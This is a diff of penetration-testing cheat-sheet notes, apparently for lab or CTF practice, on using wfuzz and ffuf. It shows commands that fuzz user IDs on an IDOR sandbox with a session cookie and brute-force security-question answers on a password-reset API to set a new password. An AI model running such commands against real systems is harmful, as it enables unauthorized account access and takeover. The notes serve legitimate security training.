@@ -1,4 +1,4 @@
-### wfuzz
+# wfuzz
 ```
 curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64"
 ...
@@ -6,7 +6,17 @@ curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' -
 
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64" http://idor-sandbox:80/user/?uid=FUZZ
 ```
-### ffuf
+# ffuf
+### Parameters
+-r follow redirects  
+-fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges  
+-fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges  
+-fmode              Filter set operator. Either of: and, or (default: or)  
+-fr                 Filter regexp  
+-fs                 Filter HTTP response size. Comma separated list of sizes and ranges  
+-ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100  
+-fw                 Filter by amount of words in response. Comma separated list of word counts and ranges  
+### Example
 ffuf -w colors-list.txt:ANSWER -w supplieremails.txt:EMAIL -u http://154.57.164.72:31020/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}'
 
 ### Enumerating Vhosts
